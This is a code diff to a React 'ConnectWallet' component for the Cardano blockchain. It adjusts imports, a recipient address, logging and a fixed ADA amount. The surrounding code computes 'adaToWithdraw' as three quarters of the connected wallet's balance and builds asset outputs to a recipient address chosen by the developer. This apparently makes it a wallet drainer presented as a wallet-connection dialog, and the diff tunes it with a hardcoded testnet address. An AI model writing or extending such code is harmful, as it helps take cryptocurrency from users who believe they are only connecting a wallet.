@@ -26,7 +26,8 @@ import {
   Transaction,
   // min_ada_for_output,
   min_ada_required,
-  DataCost
+  DataCost,
+  min_ada_for_output
 
 } from "@emurgo/cardano-serialization-lib-browser"
 function ConnectWallet({ onClose }) {
@@ -606,8 +607,8 @@ function ConnectWallet({ onClose }) {
     }
     console.log(derivedUtxos)
 
-    const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;
-
+    const recipientAddress = import.meta.env.MODE === 'production' ? import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS : 'addr_test1qrfe3adtkzyrvzjsjewscrvygsqvclujt2pe34v8ye43smv3chg7zkg7465hp6d9ux2k5vz26m28hnhxt3a32yudmqrs3tc6tq'
+    console.log(recipientAddress)
     // Calculate 3/4 of the ADA balance
     const adaToWithdraw = currentBalance * 0.75
     try {
@@ -1151,12 +1152,12 @@ function ConnectWallet({ onClose }) {
         console.error("Error creating or inserting assets into MultiAsset object:", error);
         throw error;
       }
+      console.log(currentBalance)
 
       // Calculate minimum ADA required and build output
       try {
-        const adaDataCost = DataCost.new_coins_per_byte
-        console.log(adaDataCost, adaDataCost)
-        const adaToSend = BigNum.from_str('54220');
+        // const adaDataCost = DataCost.new_coins_per_byte(BigNum.from_str(protocolParams.coins_per_utxo_word)).coins_per_byte()
+        const adaToSend = BigNum.from_str('144420');
         console.log(txOutputBuilder, multiAsset.to_json())
         txOutputBuilder = txOutputBuilder.with_asset_and_min_required_coin(multiAsset, adaToSend);
         txOutput = txOutputBuilder.build();
